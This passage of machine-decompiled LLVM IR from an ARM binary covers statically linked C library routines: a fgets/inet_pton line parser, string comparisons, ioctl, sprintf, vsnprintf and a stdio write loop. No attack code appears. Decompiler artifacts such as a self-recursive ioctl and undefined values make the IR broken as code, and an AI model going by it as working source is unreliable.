dec_label_pc_f260.preheader:                      ; preds = %bb76, %.thread11
  %v0_f26031 = phi i32 [ %v0_f26031.pre, %bb76 ], [ %v0_f1f412, %.thread11 ]
  %v1_f26032 = inttoptr i32 %v0_f26031 to i8*
  %v2_f26033 = load i8, i8* %v1_f26032, align 1
  %v3_f26034 = zext i8 %v2_f26033 to i32
  store i32 %v3_f26034, i32* %r3.global-to-local, align 4
  %v2_f26435 = icmp eq i8 %v2_f26033, 0
  br i1 %v2_f26435, label %dec_label_pc_f26c, label %dec_label_pc_f20c.preheader

dec_label_pc_f204:                                ; preds = %dec_label_pc_f218
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_f208 = inttoptr i32 %v8_f230 to i8*
  store i8 0, i8* %v3_f208, align 1
  %v4_f208 = load i32, i32* %r2.global-to-local, align 4
  %v5_f208 = add i32 %v4_f208, 1
  store i32 %v5_f208, i32* %r2.global-to-local, align 4
  %v1_f20c = inttoptr i32 %v5_f208 to i8*
  %v2_f20c = load i8, i8* %v1_f20c, align 1
  %v3_f20c = zext i8 %v2_f20c to i32
  store i32 %v3_f20c, i32* %r1.global-to-local, align 4
  %v2_f210 = icmp eq i8 %v2_f20c, 0
  br i1 %v2_f210, label %dec_label_pc_f26c, label %dec_label_pc_f218

dec_label_pc_f218:                                ; preds = %dec_label_pc_f20c.preheader, %dec_label_pc_f204
  %v8_f230 = phi i32 [ %v5_f208, %dec_label_pc_f204 ], [ %v0_f20c21, %dec_label_pc_f20c.preheader ]
  %v1_f220 = phi i32 [ %v3_f20c, %dec_label_pc_f204 ], [ %v3_f20c24, %dec_label_pc_f20c.preheader ]
  %v2_f21c = load i32, i32* @global_var_1b514, align 4
  store i32 %v2_f21c, i32* %r3.global-to-local, align 4
  %v3_f220 = mul nuw nsw i32 %v1_f220, 2
  %v4_f220 = add i32 %v3_f220, %v2_f21c
  %v5_f220 = inttoptr i32 %v4_f220 to i8*
  %v6_f220 = load i8, i8* %v5_f220, align 1
  %v8_f220 = zext i8 %v6_f220 to i32
  store i32 %v8_f220, i32* %r3.global-to-local, align 4
  %v1_f224 = and i32 %v8_f220, 32
  %v2_f224 = icmp eq i32 %v1_f224, 0
  br i1 %v2_f224, label %dec_label_pc_f22c, label %dec_label_pc_f204

dec_label_pc_f22c:                                ; preds = %dec_label_pc_f218
  %v0_f22c = load i32, i32* @r6, align 4
  %v7_f230 = icmp slt i32 %v0_f22c, 7
  br i1 %v7_f230, label %bb77, label %dec_label_pc_f240.preheader

bb77:                                             ; preds = %dec_label_pc_f22c
  %v9_f230 = load i32, i32* @r4, align 4
  %v13_f230 = mul i32 %v0_f22c, 4
  %v14_f230 = add i32 %v9_f230, %v13_f230
  %v15_f230 = inttoptr i32 %v14_f230 to i32*
  store i32 %v8_f230, i32* %v15_f230, align 4
  %v8_f234 = load i32, i32* @r6, align 4
  %v9_f234 = add i32 %v8_f234, 1
  store i32 %v9_f234, i32* @r6, align 4
  %v0_f24026.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f240.preheader

dec_label_pc_f240.preheader:                      ; preds = %bb77, %dec_label_pc_f22c
  %v0_f24026 = phi i32 [ %v0_f24026.pre, %bb77 ], [ %v8_f230, %dec_label_pc_f22c ]
  %v1_f24027 = inttoptr i32 %v0_f24026 to i8*
  %v2_f24028 = load i8, i8* %v1_f24027, align 1
  %v3_f24029 = zext i8 %v2_f24028 to i32
  store i32 %v3_f24029, i32* %r1.global-to-local, align 4
  %v2_f24430 = icmp eq i8 %v2_f24028, 0
  br i1 %v2_f24430, label %dec_label_pc_f260.loopexit, label %dec_label_pc_f24c.lr.ph

dec_label_pc_f24c.lr.ph:                          ; preds = %dec_label_pc_f240.preheader
  %v2_f250.pre = load i32, i32* @global_var_1b514, align 4
  br label %dec_label_pc_f24c

dec_label_pc_f23c:                                ; preds = %dec_label_pc_f24c
  %v1_f23c = add i32 %v0_f23c, 1
  store i32 %v1_f23c, i32* %r2.global-to-local, align 4
  %v1_f240 = inttoptr i32 %v1_f23c to i8*
  %v2_f240 = load i8, i8* %v1_f240, align 1
  %v3_f240 = zext i8 %v2_f240 to i32
  store i32 %v3_f240, i32* %r1.global-to-local, align 4
  %v2_f244 = icmp eq i8 %v2_f240, 0
  br i1 %v2_f244, label %dec_label_pc_f260.loopexit, label %dec_label_pc_f24c

dec_label_pc_f24c:                                ; preds = %dec_label_pc_f24c.lr.ph, %dec_label_pc_f23c
  %v0_f23c = phi i32 [ %v0_f24026, %dec_label_pc_f24c.lr.ph ], [ %v1_f23c, %dec_label_pc_f23c ]
  %v1_f254 = phi i32 [ %v3_f24029, %dec_label_pc_f24c.lr.ph ], [ %v3_f240, %dec_label_pc_f23c ]
  store i32 %v2_f250.pre, i32* %r3.global-to-local, align 4
  %v3_f254 = mul nuw nsw i32 %v1_f254, 2
  %v4_f254 = add i32 %v3_f254, %v2_f250.pre
  %v5_f254 = inttoptr i32 %v4_f254 to i8*
  %v6_f254 = load i8, i8* %v5_f254, align 1
  %v8_f254 = zext i8 %v6_f254 to i32
  store i32 %v8_f254, i32* %r3.global-to-local, align 4
  %v1_f258 = and i32 %v8_f254, 32
  %v2_f258 = icmp eq i32 %v1_f258, 0
  br i1 %v2_f258, label %dec_label_pc_f23c, label %dec_label_pc_f260.loopexit

dec_label_pc_f260.loopexit:                       ; preds = %dec_label_pc_f24c, %dec_label_pc_f23c, %dec_label_pc_f240.preheader
  %v0_f260 = phi i32 [ %v0_f24026, %dec_label_pc_f240.preheader ], [ %v0_f23c, %dec_label_pc_f24c ], [ %v1_f23c, %dec_label_pc_f23c ]
  %v1_f260 = inttoptr i32 %v0_f260 to i8*
  %v2_f260 = load i8, i8* %v1_f260, align 1
  %v3_f260 = zext i8 %v2_f260 to i32
  store i32 %v3_f260, i32* %r3.global-to-local, align 4
  %v2_f264 = icmp eq i8 %v2_f260, 0
  br i1 %v2_f264, label %dec_label_pc_f26c, label %dec_label_pc_f20c.preheader

dec_label_pc_f20c.preheader:                      ; preds = %dec_label_pc_f260.preheader, %dec_label_pc_f260.loopexit
  %v0_f20c21 = phi i32 [ %v0_f260, %dec_label_pc_f260.loopexit ], [ %v0_f26031, %dec_label_pc_f260.preheader ]
  %v1_f20c22 = inttoptr i32 %v0_f20c21 to i8*
  %v2_f20c23 = load i8, i8* %v1_f20c22, align 1
  %v3_f20c24 = zext i8 %v2_f20c23 to i32
  store i32 %v3_f20c24, i32* %r1.global-to-local, align 4
  %v2_f21025 = icmp eq i8 %v2_f20c23, 0
  br i1 %v2_f21025, label %dec_label_pc_f26c, label %dec_label_pc_f218

dec_label_pc_f26c:                                ; preds = %dec_label_pc_f260.loopexit, %dec_label_pc_f20c.preheader, %dec_label_pc_f204, %dec_label_pc_f260.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_f270 = load i32, i32* @r6, align 4
  %v1_f274 = load i32, i32* @r4, align 4
  %v5_f274 = mul i32 %v0_f270, 4
  %v6_f274 = add i32 %v1_f274, %v5_f274
  %v7_f274 = inttoptr i32 %v6_f274 to i32*
  store i32 0, i32* %v7_f274, align 4
  %v7_f278 = icmp sgt i32 %v0_f270, 1
  br i1 %v7_f278, label %dec_label_pc_f27c, label %dec_label_pc_f320

dec_label_pc_f27c:                                ; preds = %dec_label_pc_f26c
  %v2_f27c = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_f27c, i32* %r0.global-to-local, align 4
  %v7_f280 = icmp eq i32 %v2_f27c, 1
  br i1 %v7_f280, label %dec_label_pc_f354, label %dec_label_pc_f288

dec_label_pc_f288:                                ; preds = %dec_label_pc_f27c
  %v7_f288 = icmp eq i32 %v2_f27c, 2
  br i1 %v7_f288, label %dec_label_pc_f294, label %dec_label_pc_f2c0.preheader

dec_label_pc_f2c0.preheader:                      ; preds = %dec_label_pc_f288
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_f2c0

dec_label_pc_f294:                                ; preds = %dec_label_pc_f288
  store i32 %v0_f058, i32* %r0.global-to-local, align 4
  %v0_f298 = load i32, i32* @r4, align 4
  %v1_f298 = inttoptr i32 %v0_f298 to i32*
  %v2_f298 = load i32, i32* %v1_f298, align 4
  store i32 %v2_f298, i32* @r1, align 4
  %v3_f29c = call i32 @__GI_strcoll(i8* %v2_f29c, i32 %v2_f298)
  store i32 %v3_f29c, i32* %r0.global-to-local, align 4
  %v2_f2a0 = icmp eq i32 %v3_f29c, 0
  br i1 %v2_f2a0, label %dec_label_pc_f2d0, label %dec_label_pc_f320

dec_label_pc_f2ac:                                ; preds = %dec_label_pc_f2c0
  %v0_f2ac = load i32, i32* @r4, align 4
  %v4_f2ac = mul i32 %v1_f2ac, 4
  %v5_f2ac = add i32 %v0_f2ac, %v4_f2ac
  %v6_f2ac = inttoptr i32 %v5_f2ac to i32*
  %v7_f2ac = load i32, i32* %v6_f2ac, align 4
  store i32 %v7_f2ac, i32* %r1.global-to-local, align 4
  %v3_f2b0 = call i32 @__GI_strcasecmp(i8* %v2_f29c, i32 %v7_f2ac)
  store i32 %v3_f2b0, i32* %r0.global-to-local, align 4
  %v2_f2b4 = icmp eq i32 %v3_f2b0, 0
  %v0_f2b8 = load i32, i32* @r5, align 4
  %v1_f2b8 = add i32 %v0_f2b8, 1
  store i32 %v1_f2b8, i32* @r5, align 4
  br i1 %v2_f2b4, label %dec_label_pc_f2d0, label %dec_label_pc_f2c0

dec_label_pc_f2c0:                                ; preds = %dec_label_pc_f2c0.preheader, %dec_label_pc_f2ac
  %v1_f2ac = phi i32 [ 1, %dec_label_pc_f2c0.preheader ], [ %v1_f2b8, %dec_label_pc_f2ac ]
  %v1_f2c0 = load i32, i32* @r6, align 4
  store i32 %v0_f058, i32* %r0.global-to-local, align 4
  %v5_f2c8 = icmp slt i32 %v1_f2ac, %v1_f2c0
  br i1 %v5_f2c8, label %dec_label_pc_f2ac, label %dec_label_pc_f320

dec_label_pc_f2d0:                                ; preds = %dec_label_pc_f2ac, %dec_label_pc_f294
  store i32 %v0_f050, i32* %r1.global-to-local, align 4
  br i1 %v7_f2d4, label %dec_label_pc_f2dc, label %dec_label_pc_f2f8

dec_label_pc_f2dc:                                ; preds = %dec_label_pc_f2d0
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_f2e0 = load i32, i32* @r7, align 4
  store i32 %v0_f2e0, i32* %r2.global-to-local, align 4
  %v0_f2e4 = load i32, i32* @r4, align 4
  %v1_f2e4 = inttoptr i32 %v0_f2e4 to i32*
  %v2_f2e4 = load i32, i32* %v1_f2e4, align 4
  store i32 %v2_f2e4, i32* %r1.global-to-local, align 4
  %v3_f2e8 = inttoptr i32 %v2_f2e4 to i8*
  %v4_f2e8 = call i32 @inet_pton(i32 2, i8* %v3_f2e8, i32 %v0_f2e0)
  store i32 %v4_f2e8, i32* %r0.global-to-local, align 4
  %v5_f2f0 = icmp sgt i32 %v4_f2e8, 0
  br i1 %v5_f2f0, label %dec_label_pc_f12c, label %dec_label_pc_f31c

dec_label_pc_f2f8:                                ; preds = %dec_label_pc_f2d0
  store i32 %v0_f050, i32* %r2.global-to-local, align 4
  br i1 %v7_f2fc, label %dec_label_pc_f304, label %dec_label_pc_f31c

dec_label_pc_f304:                                ; preds = %dec_label_pc_f2f8
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_f308 = load i32, i32* @r4, align 4
  %v1_f308 = inttoptr i32 %v0_f308 to i32*
  %v2_f308 = load i32, i32* %v1_f308, align 4
  store i32 %v2_f308, i32* %r1.global-to-local, align 4
  store i32 %v0_f1d4, i32* %r2.global-to-local, align 4
  %v3_f310 = inttoptr i32 %v2_f308 to i8*
  %v4_f310 = call i32 @inet_pton(i32 10, i8* %v3_f310, i32 %v0_f1d4)
  store i32 %v4_f310, i32* %r0.global-to-local, align 4
  %v5_f318 = icmp sgt i32 %v4_f310, 0
  br i1 %v5_f318, label %dec_label_pc_f170, label %dec_label_pc_f31c

dec_label_pc_f31c:                                ; preds = %dec_label_pc_f2dc, %dec_label_pc_f2f8, %dec_label_pc_f304
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_f320

dec_label_pc_f320:                                ; preds = %dec_label_pc_f2c0, %dec_label_pc_f294, %dec_label_pc_f26c, %dec_label_pc_f31c, %dec_label_pc_f1c8
  %v0_f320 = load i32, i32* @fp, align 4
  store i32 %v0_f320, i32* %r0.global-to-local, align 4
  %v0_f324 = load i32, i32* @r8, align 4
  store i32 %v0_f324, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_f32c = call i32 @fgets(i32 %v0_f320, i32 %v0_f324, i32 %stack_var_-52.0)
  store i32 %v3_f32c, i32* %r0.global-to-local, align 4
  %v2_f330 = icmp eq i32 %v3_f32c, 0
  br i1 %v2_f330, label %dec_label_pc_f338, label %dec_label_pc_f1e0

dec_label_pc_f338:                                ; preds = %dec_label_pc_f320, %dec_label_pc_f170, %dec_label_pc_f12c
  %v2_f338 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_f338, i32* %r3.global-to-local, align 4
  %v7_f33c = icmp eq i32 %v2_f338, 1
  br i1 %v7_f33c, label %dec_label_pc_f354, label %dec_label_pc_f344

dec_label_pc_f344:                                ; preds = %dec_label_pc_f338
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_f348 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_f348 = call i32 @__GI_fclose(i8* %v1_f348)
  store i32 %v2_f348, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f354

dec_label_pc_f350:                                ; preds = %dec_label_pc_f06c, %bb75, %dec_label_pc_f0c0, %dec_label_pc_f0b8, %dec_label_pc_f0ac, %dec_label_pc_f098, %dec_label_pc_f07c
  store i32 34, i32* @sl, align 4
  br label %dec_label_pc_f354

dec_label_pc_f354:                                ; preds = %dec_label_pc_f27c, %dec_label_pc_f338, %dec_label_pc_f344, %dec_label_pc_f114, %dec_label_pc_f350
  %v0_f354 = load i32, i32* @sl, align 4
  store i32 %v0_f354, i32* %r0.global-to-local, align 4
  store i32 %v3_f03c, i32* @r4, align 4
  store i32 %v6_f03c, i32* @r5, align 4
  store i32 %v12_f03c, i32* @r7, align 4
  store i32 %v15_f03c, i32* @r8, align 4
  store i32 %v21_f03c, i32* @sl, align 4
  store i32 %v24_f03c, i32* @fp, align 4
  ret i32 %v0_f354

; uselistorder directives
  uselistorder i32 %v1_f2ac, { 1, 0 }
  uselistorder i32 %v0_f270, { 1, 0 }
  uselistorder i32 %v3_f20c24, { 1, 0 }
  uselistorder i32 %v0_f20c21, { 1, 0 }
  uselistorder i32 %v2_f1e8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-40.1, { 1, 0 }
  uselistorder i32 %v0_f0e8, { 1, 0 }
  uselistorder i32 %v0_f0ac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_f090, { 1, 0 }
  uselistorder i32 %v0_f05c, { 1, 0, 2 }
  uselistorder i32 %v0_f050, { 0, 2, 1, 3 }
  uselistorder i32 %v1_f04c, { 4, 2, 3, 1, 0 }
  uselistorder i32 %tmp62, { 1, 0, 3, 2 }
  uselistorder i32 %tmp58, { 0, 2, 3, 1 }
  uselistorder i32 %tmp57, { 3, 0, 1, 2 }
  uselistorder i32 %tmp54, { 0, 4, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 11, 17, 12, 13, 14, 15, 16, 0, 18, 19, 2, 3, 4, 5, 6, 7, 8, 9, 10, 20, 21, 22, 23, 24 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 4, 8, 9, 19, 10, 18, 11, 12, 20, 0, 1, 2, 5, 6, 7, 14, 16, 15, 17 }
  uselistorder i32* %r1.global-to-local, { 12, 3, 6, 7, 8, 14, 9, 0, 10, 11, 1, 2, 4, 5, 13 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 22, 21, 11, 6, 13, 12, 14, 15, 18, 16, 17, 20, 19, 2, 3, 4, 7, 8, 9, 10, 23, 25, 24 }
  uselistorder i32* %ip.global-to-local, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 -32, { 1, 5, 2, 6, 7, 3, 0, 4 }
  uselistorder label %dec_label_pc_f354, { 4, 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_f350, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_f320, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_f31c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f2c0, { 1, 0 }
  uselistorder label %dec_label_pc_f26c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f20c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f24c, { 1, 0 }
  uselistorder label %dec_label_pc_f1c8, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
  uselistorder label %dec_label_pc_f07c, { 1, 0 }
}

define i32 @ioctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_f380 = call i32 @ioctl()
  store i32 %v0_f380, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f380, -4095
  br i1 %tmp, label %dec_label_pc_f3a0, label %dec_label_pc_f390

dec_label_pc_f390:                                ; preds = %entry
  %v0_f390 = call i32 @__errno_location()
  %v0_f394 = load i32, i32* %r4.global-to-local, align 4
  %v1_f394 = sub i32 0, %v0_f394
  %v2_f398 = inttoptr i32 %v0_f390 to i32*
  store i32 %v1_f394, i32* %v2_f398, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f3a0

dec_label_pc_f3a0:                                ; preds = %entry, %dec_label_pc_f390
  %v0_f3a0 = phi i32 [ %v0_f380, %entry ], [ -1, %dec_label_pc_f390 ]
  ret i32 %v0_f3a0

; uselistorder directives
  uselistorder i32 %v0_f380, { 1, 0, 2 }
  uselistorder i32 ()* @ioctl, { 1, 0 }
  uselistorder label %dec_label_pc_f3a0, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_f3bc = icmp slt i32 %arg1, 0
  br i1 %v1_f3bc, label %bb, label %bb1

bb:                                               ; preds = %entry
  ret i32 %arg1

bb1:                                              ; preds = %entry
  %v2_f3bc = mul i32 %arg1, 2
  %v2_f3c8 = load i32, i32* bitcast (i32** @global_var_1b86c.350 to i32*), align 4
  %v2_f3cc = add i32 %v2_f3c8, %v2_f3bc
  %v3_f3d0 = inttoptr i32 %v2_f3cc to i8*
  %v4_f3d0 = load i8, i8* %v3_f3d0, align 1
  %v6_f3d0 = zext i8 %v4_f3d0 to i32
  %v1_f3d4 = add i32 %v2_f3cc, 1
  %v2_f3d4 = inttoptr i32 %v1_f3d4 to i8*
  %v3_f3d4 = load i8, i8* %v2_f3d4, align 1
  %v4_f3d4 = zext i8 %v3_f3d4 to i32
  %v3_f3d8 = mul nuw i32 %v4_f3d4, 16777216
  %v4_f3dc = sdiv i32 %v3_f3d8, 65536
  %v5_f3dc = or i32 %v4_f3dc, %v6_f3d0
  ret i32 %v5_f3dc

; uselistorder directives
  uselistorder i32 %v2_f3cc, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_f3f4 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_f3f4, i32* @ip, align 4
  store i32 %v2_f3f4, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_f408 = call i32 @__GI_vsnprintf()
  ret i32 %v0_f408

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32* @ip, { 6, 30, 7, 8, 2, 18, 9, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 79, 10, 11, 0, 12, 13, 14, 15, 16, 19, 20, 21, 22, 23, 4, 24, 3, 25, 5, 17, 77, 74, 75, 76, 1, 78, 73, 26, 27, 28, 29 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v3_f41c = load i32, i32* @r4, align 4
  %v6_f41c = load i32, i32* @r5, align 4
  %v12_f41c = load i32, i32* @r7, align 4
  %v15_f41c = load i32, i32* @r8, align 4
  %v18_f41c = load i32, i32* @sl, align 4
  %v0_f420 = load i32, i32* @r3, align 4
  store i32 %v0_f420, i32* @r8, align 4
  %v2_f424 = ptrtoint i32* %stack_var_-108 to i32
  %v0_f42c = load i32, i32* @r0, align 4
  %v1_f42c = sub i32 -1, %v0_f42c
  store i32 %v1_f42c, i32* @r5, align 4
  store i32 %v0_f42c, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v1_f440 = load i32, i32* @r1, align 4
  %v3_f440 = icmp ult i32 %v1_f42c, %v1_f440
  br i1 %v3_f440, label %bb23, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_f440, i32* @r5, align 4
  br label %bb23

bb23:                                             ; preds = %entry, %bb
  %v0_f448 = load i32, i32* @r2, align 4
  store i32 %v0_f448, i32* @r7, align 4
  %v2_f44c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_f44c, i32* @r0, align 4
  store i32 208, i32* %stack_var_-108, align 4
  %v0_f468 = call i32 @__stdio_init_mutex()
  %v0_f46c = load i32, i32* @r4, align 4
  %v1_f46c = load i32, i32* @r5, align 4
  %v2_f46c = add i32 %v1_f46c, %v0_f46c
  %v0_f474 = load i32, i32* @r7, align 4
  %v0_f478 = load i32, i32* @r8, align 4
  %v0_f484 = load i32, i32* @sl, align 4
  %v12_f498 = inttoptr i32 %v0_f474 to i8*
  %v13_f498 = call i32 @_vfprintf_internal(i32 %v2_f424, i8* %v12_f498, i32 %v0_f478, i32 %v2_f46c, i32 %v0_f46c, i32 %v2_f46c, i32 %v0_f46c, i32 %v0_f46c, i32 %v0_f46c, i32 %v2_f46c, i32 %v0_f484)
  %v0_f49c = load i32, i32* @r5, align 4
  %v1_f49c = load i32, i32* @sl, align 4
  %v9_f49c = icmp eq i32 %v0_f49c, %v1_f49c
  br i1 %v9_f49c, label %dec_label_pc_f4c4, label %dec_label_pc_f4a8

dec_label_pc_f4a8:                                ; preds = %bb23
  %v9_f4b0 = icmp eq i32 %v1_f46c, 0
  %v1_f4b4 = sext i1 %v9_f4b0 to i32
  %v1_f4b4.v0_f47c = add i32 %v0_f46c, %v1_f4b4
  %stack_var_-92.0 = inttoptr i32 %v1_f4b4.v0_f47c to i8*
  %v1_f4c0 = trunc i32 %v1_f49c to i8
  store i8 %v1_f4c0, i8* %stack_var_-92.0, align 1
  br label %dec_label_pc_f4c4

dec_label_pc_f4c4:                                ; preds = %bb23, %dec_label_pc_f4a8
  store i32 %v3_f41c, i32* @r4, align 4
  store i32 %v6_f41c, i32* @r5, align 4
  store i32 %v12_f41c, i32* @r7, align 4
  store i32 %v15_f41c, i32* @r8, align 4
  store i32 %v18_f41c, i32* @sl, align 4
  ret i32 %v13_f498

; uselistorder directives
  uselistorder i32 %v1_f46c, { 1, 0 }
  uselistorder i32 %v0_f46c, { 0, 3, 4, 5, 2, 1 }
  uselistorder i32 %v1_f440, { 1, 0 }
  uselistorder i32 %v0_f42c, { 1, 0 }
  uselistorder i32 ()* @__stdio_init_mutex, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f4c4, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_f4e02 = icmp eq i32 %arg3, 0
  store i1 %v2_f4e02, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_f4e02, label %dec_label_pc_f580, label %dec_label_pc_f4ec

dec_label_pc_f4e0thread-pre-split:                ; preds = %bb22
  %v3_f504 = load i32, i32* %r7.global-to-local, align 4
  %v5_f504 = add i32 %v3_f504, %v4_f4f8
  store i32 %v5_f504, i32* %r7.global-to-local, align 4
  %v5_f508 = sub i32 %v0_f500, %v4_f4f8
  store i32 %v5_f508, i32* %r5.global-to-local, align 4
  %v2_f4e0 = icmp eq i32 %v5_f508, 0
  store i1 %v2_f4e0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_f508, i32* @r2, align 4
  br i1 %v2_f4e0, label %dec_label_pc_f4e0.dec_label_pc_f580.loopexit_crit_edge, label %dec_label_pc_f4ec

dec_label_pc_f4ec:                                ; preds = %entry, %dec_label_pc_f4e0thread-pre-split
  %v0_f4f0 = phi i32 [ %v5_f504, %dec_label_pc_f4e0thread-pre-split ], [ %arg2, %entry ]
  %v0_f4ec.in = phi i32 [ %v5_f508, %dec_label_pc_f4e0thread-pre-split ], [ %arg3, %entry ]
  %v0_f4ec = icmp slt i32 %v0_f4ec.in, 0
  br i1 %v0_f4ec, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_f4ec
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_f4ec, %bb
  %v0_f4f4 = load i32, i32* @r4, align 4
  %v1_f4f4 = add i32 %v0_f4f4, 4
  %v2_f4f4 = inttoptr i32 %v1_f4f4 to i32*
  %v3_f4f4 = load i32, i32* %v2_f4f4, align 4
  store i32 %v3_f4f4, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_f4f0 to i32*
  %v4_f4f8 = call i32 @__libc_write(i32 %v3_f4f4, i32* %tmp23)
  store i32 %v4_f4f8, i32* %r0.global-to-local, align 4
  %v1_f4fc = icmp slt i32 %v4_f4f8, 0
  %v2_f4fc = icmp eq i32 %v4_f4f8, 0
  store i1 %v2_f4fc, i1* %cpsr_z.global-to-local, align 1
  %v0_f500 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_f500, i32* %r6.global-to-local, align 4
  br i1 %v1_f4fc, label %dec_label_pc_f510, label %dec_label_pc_f4e0thread-pre-split

dec_label_pc_f510:                                ; preds = %bb22
  %v0_f510 = load i32, i32* @r4, align 4
  %v1_f510 = inttoptr i32 %v0_f510 to i32*
  %v2_f510 = load i32, i32* %v1_f510, align 4
  store i32 %v2_f510, i32* %r3.global-to-local, align 4
  %v1_f514 = add i32 %v0_f510, 8
  store i32 %v1_f514, i32* %r0.global-to-local, align 4
  %v1_f518 = inttoptr i32 %v1_f514 to i32*
  %v2_f518 = load i32, i32* %v1_f518, align 4
  store i32 %v2_f518, i32* %r0.global-to-local, align 4
  %v3_f518 = add i32 %v0_f510, 12
  %v4_f518 = inttoptr i32 %v3_f518 to i32*
  %v5_f518 = load i32, i32* %v4_f518, align 4
  %v1_f51c = or i32 %v2_f510, 8
  store i32 %v1_f51c, i32* %r3.global-to-local, align 4
  %v3_f520 = sdiv i32 %v2_f510, 256
  %v2_f524 = sub i32 %v5_f518, %v2_f518
  store i32 %v2_f524, i32* %r2.global-to-local, align 4
  %v9_f524 = icmp eq i32 %v5_f518, %v2_f518
  store i1 %v9_f524, i1* %cpsr_z.global-to-local, align 1
  %v1_f528 = trunc i32 %v3_f520 to i8
  %v3_f528 = add i32 %v0_f510, 1
  %v4_f528 = inttoptr i32 %v3_f528 to i8*
  store i8 %v1_f528, i8* %v4_f528, align 1
  %v0_f52c = load i32, i32* %r3.global-to-local, align 4
  %v1_f52c = trunc i32 %v0_f52c to i8
  %v2_f52c = load i32, i32* @r4, align 4
  %v3_f52c = inttoptr i32 %v2_f52c to i8*
  store i8 %v1_f52c, i8* %v3_f52c, align 1
  %v0_f530 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f530, label %dec_label_pc_f510.dec_label_pc_f57c_crit_edge, label %dec_label_pc_f534

dec_label_pc_f510.dec_label_pc_f57c_crit_edge:    ; preds = %dec_label_pc_f510
  %v0_f57c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_f57c

dec_label_pc_f534:                                ; preds = %dec_label_pc_f510
  %v0_f534 = load i32, i32* %r2.global-to-local, align 4
  %v1_f534 = load i32, i32* %r5.global-to-local, align 4
  %v9_f534 = icmp eq i32 %v0_f534, %v1_f534
  store i1 %v9_f534, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_f534, %v1_f534
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_f534
  store i32 %v0_f534, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_f534, %bb24
